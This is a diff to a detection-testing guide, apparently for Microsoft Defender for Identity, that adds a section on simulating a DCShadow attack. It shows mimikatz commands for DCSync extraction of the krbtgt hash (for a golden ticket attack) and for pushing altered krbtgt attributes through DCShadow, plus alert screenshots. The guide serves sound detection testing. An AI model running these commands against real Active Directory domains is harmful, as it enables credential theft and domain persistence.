@@ -290,7 +290,7 @@ In this detection, an alert is triggered when a replication request is initiated
 From a command line run :  
 
 *mimikatz # privilege::debug*  
-*mimikatz # lsadump::dcsync /domain:msdemo.local /user:krbtgt*  => to retrieve the krbtgt's password hash to move to a golden ticket attack
+*mimikatz # lsadump::dcsync /domain:msdemo.local /user:krbtgt*  => to retrieve the krbtgt's password hash and move to a golden ticket attack
 
 Tools available from : https://github.com/gentilkiwi/mimikatz/releases  
 
@@ -303,7 +303,21 @@ In the alert Compay Segundo failed to retrieve the DCsync (not enough permission
 ![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image28.png)  
 
 ## 16 - Suspected DCShadow attack (domain controller promotion) & (domain controller replication request)
+Two alerts are available but let's focus only on the "Domain controller replication request" alert; in this scenario, attackers strive to initiate a malicious replication request, allowing them to change Active Directory objects on a genuine DC, which can give the attackers persistence in the domain.
 
+From a command line run with AD admin permissions :  
+
+*mimikatz # privilege::debug*  
+*mimikatz # lsadump::dcshadow /object:krbtgt /attribute=ntPwdHistory /value:0000000000*  => coul be useful to set an sensitive SID here
+*mimikatz # lsadump::dcshadow /push*  
+
+Tools available from : https://github.com/gentilkiwi/mimikatz/releases  
+
+Detail in the alert :  
+
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image29.png)  
+
+## 17 - 
 
 
 
